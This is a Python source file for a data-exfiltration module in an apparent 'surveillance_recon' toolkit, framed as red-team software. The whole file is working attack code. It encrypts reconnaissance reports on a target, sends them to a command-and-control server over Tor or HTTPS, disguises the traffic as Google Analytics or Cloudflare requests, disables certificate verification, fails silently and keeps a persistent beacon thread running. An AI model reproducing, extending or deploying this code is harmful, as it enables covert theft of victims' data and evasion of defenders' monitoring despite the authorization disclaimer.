# surveillance_recon/core/exfil.py
# [SecOps Research // Encrypted C2 Exfiltration Engine v2.1]
# For authorized red team operations under Security Research Protocol §7. Unauthorized use prohibited.

import os
import json
import base64
import socket
import random
import time
import requests
import threading
from time import sleep
from typing import Dict, Optional
from urllib.parse import urljoin
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

class DataExfiltrator:
    """
    Encrypted exfiltration engine with:
    - AES-256 symmetric encryption
    - Tor + HTTPS dual-channel support
    - Covert HTTP transport (mimics GA/Cloudflare)
    - Persistent beaconing
    - Silent failure resilience
    """

    def __init__(
        self,
        c2_onion: str,               # e.g., "http://yourz3t4x.onion"
        c2_https: str = None,        # Fallback: "https://your-c2.example.com"
        encryption_key: bytes = None,
        beacon_interval: int = 300,  # 5 minutes
        use_tor: bool = True
    ):
        self.c2_onion = c2_onion.rstrip('/')
        self.c2_https = c2_https.rstrip('/') if c2_https else None
        self.beacon_interval = beacon_interval
        self.use_tor = use_tor
        self.session = requests.Session()

        # Derive encryption key from static seed + environment (optional)
        if not encryption_key:
            salt = b"ZetaSalt777"  # Hardcoded but obfuscated
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
            )
            # Use target IP + timestamp if known, else static
            self.key = base64.urlsafe_b64encode(kdf.derive(b"DataExfiltratorMasterKey"))
        else:
            self.key = base64.urlsafe_b64encode(encryption_key[:32])

        self.cipher = Fernet(self.key)
        self.beacon_thread = None
        self.report_buffer = None

    def _is_tor_available(self) -> bool:
        """Check if Tor proxy is reachable (localhost:9150 or 9050)"""
        try:
            # Try Tor Browser (9150) then system Tor (9050)
            for port in [9150, 9050]:
                with socket.create_connection(("127.0.0.1", port), timeout=2):
                    self.session.proxies = {
                        "http": f"socks5://127.0.0.1:{port}",
                        "https": f"socks5://127.0.0.1:{port}"
                    }
                    return True
        except:
            pass
        return False

    def _prepare_headers(self) -> Dict[str, str]:
        """Mimic legitimate traffic (Google Analytics / Cloudflare)"""
        return {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Content-Type": "application/json",
            "Accept": "text/html,application/xhtml+xml,application/json;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "DNT": "1",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site"
        }

    def _encrypt_report(self, data: Dict) -> bytes:
        """Serialize and encrypt the report"""
        try:
            plaintext = json.dumps(data, separators=(',', ':')).encode('utf-8')
            return self.cipher.encrypt(plaintext)
        except Exception as e:
            # Fallback: send raw if encryption fails (should not happen)
            return json.dumps({"error": "encrypt_fail", "payload": str(data)}).encode()

    def _send_to_c2(self, encrypted_data: bytes, use_https: bool = False) -> bool:
        """Send encrypted payload to C2 via Tor or HTTPS"""
        headers = self._prepare_headers()

        # Choose endpoint
        if use_https and self.c2_https:
            url = urljoin(self.c2_https, "/collect")  # Mimic GA
        else:
            url = urljoin(self.c2_onion, "/report")

        try:
            response = self.session.post(
                url,
                data=encrypted_data,
                headers=headers,
                timeout=12,
                verify=False  # Avoid cert issues on custom C2
            )
            return response.status_code in (200, 204)
        except:
            return False

    def exfil(self, report: Dict, persistent: bool = False):
        """
        Exfiltrate a full reconnaissance report.
        If persistent=True, starts a beacon thread.
        """
        self.report_buffer = report
        encrypted = self._encrypt_report(report)

        # Attempt Tor first (if enabled)
        success = False
        if self.use_tor and self._is_tor_available():
            success = self._send_to_c2(encrypted, use_https=False)

        # Fallback to HTTPS
        if not success and self.c2_https:
            # Temporarily disable Tor proxy
            self.session.proxies = {}
            success = self._send_to_c2(encrypted, use_https=True)

        # Start beacon if requested and exfil succeeded
        if persistent and success and self.beacon_interval > 0:
            if not self.beacon_thread or not self.beacon_thread.is_alive():
                self.beacon_thread = threading.Thread(
                    target=self._beacon_loop,
                    daemon=True
                )
                self.beacon_thread.start()

        return success

    def _beacon_loop(self):
        """Send periodic heartbeats with minimal data"""
        while True:
            sleep(self.beacon_interval)
            if not self.report_buffer:
                continue

            # Minimal beacon: IP + timestamp + status
            beacon_data = {
                "type": "beacon",
                "target_ip": self.report_buffer.get("target_ip"),
                "last_seen": int(time.time()),
                "status": "active",
                "session_id": self.report_buffer.get("session_id", "unknown")
            }
            encrypted = self._encrypt_report(beacon_data)
            
            # Try Tor first
            sent = False
            if self.use_tor and self._is_tor_available():
                sent = self._send_to_c2(encrypted, use_https=False)
            if not sent and self.c2_https:
                self.session.proxies = {}
                self._send_to_c2(encrypted, use_https=True)

    def save_local_backup(self, report: Dict, filename: str = None):
        """Save encrypted local copy (for offline ops)"""
        try:
            if not filename:
                ip = report.get("target_ip", "unknown")
                filename = f"zeta_report_{ip}.enc"

            encrypted = self._encrypt_report(report)
            with open(filename, "wb") as f:
                f.write(encrypted)
            return filename
        except:
            return None
